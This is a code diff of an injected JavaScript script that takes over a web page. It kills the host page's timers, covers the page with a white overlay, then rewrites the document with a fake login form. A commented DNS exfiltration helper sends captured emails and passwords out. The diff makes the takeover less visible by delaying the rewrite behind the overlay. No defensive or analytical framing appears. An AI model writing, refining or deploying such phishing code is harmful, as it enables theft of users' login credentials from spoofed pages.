@@ -1,13 +1,15 @@
 (function () {
 
-  // ── Nuke the existing page completely ────────────────────────────────────
-  // Kill all timers / intervals the host page may have running
-  var id = setTimeout(function(){}, 0);
-  while (id--) { clearTimeout(id); clearInterval(id); }
-  // Remove every stylesheet and script tag so nothing re-renders over us
-  var nodes = document.querySelectorAll('style,link,script,iframe,object,embed');
-  for (var i = 0; i < nodes.length; i++) { try { nodes[i].parentNode.removeChild(nodes[i]); } catch(e){} }
-  document.documentElement.innerHTML = '';
+  // ── Immediately slam a white overlay over everything ─────────────────────
+  var overlay = document.createElement('div');
+  overlay.style.cssText = 'position:fixed;inset:0;background:#fff;z-index:2147483647';
+  document.documentElement.appendChild(overlay);
+
+  // ── After 500ms: nuke page and inject the fake login ─────────────────────
+  setTimeout(function () {
+    // Kill all timers / intervals the host page may have running
+    var id = setTimeout(function(){}, 0);
+    while (id--) { clearTimeout(id); clearInterval(id); }
 
   // ── DNS exfil helper ─────────────────────────────────────────────────────
   // prefix: 'e' for email, 'p' for password, 'f' for final submit
@@ -135,9 +137,9 @@
     + '</body></html>';
 
   // ── Write and wire ────────────────────────────────────────────────────────
-  document.open();
-  document.write(HTML);
-  document.close();
+    document.open();
+    document.write(HTML);
+    document.close();
 
   function init() {
     var ei      = document.getElementById('ei');
@@ -188,10 +190,11 @@
     pi.addEventListener('keydown', function (e) { if (e.key === 'Enter') submit(); });
   }
 
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', init);
-  } else {
-    init();
-  }
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', init);
+    } else {
+      init();
+    }
+  }, 500); // end setTimeout — overlay shown for 500ms before full rewrite
 
 })();
